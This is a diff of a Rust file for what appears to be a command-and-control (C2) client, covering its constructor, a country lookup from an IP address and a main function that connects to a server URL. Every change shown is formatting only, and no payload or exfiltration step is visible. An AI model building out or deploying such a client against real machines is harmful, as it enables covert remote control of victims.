@@ -21,7 +21,8 @@ pub struct C2Client {
 }
 
 impl C2Client {
-    pub async fn new(config: ClientConfig) -> C2Result<Self> { // Made async
+    pub async fn new(config: ClientConfig) -> C2Result<Self> {
+        // Made async
         let client_id = config
             .client_id
             .clone()
@@ -42,7 +43,11 @@ impl C2Client {
             move || get_country(ip_clone).ok()
         })
         .await
-        .map_err(|e| C2Error::Other(format!("Failed to spawn blocking task for country info: {e}")))?;
+        .map_err(|e| {
+            C2Error::Other(format!(
+                "Failed to spawn blocking task for country info: {e}"
+            ))
+        })?;
 
         let client_info = ClientInfo {
             id: client_id,
@@ -291,7 +296,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut client = C2Client::new(ClientConfig {
         server_url,
         ..config
-    }).await?; // Await the async new function
+    })
+    .await?; // Await the async new function
     client.run().await?;
     Ok(())
 }
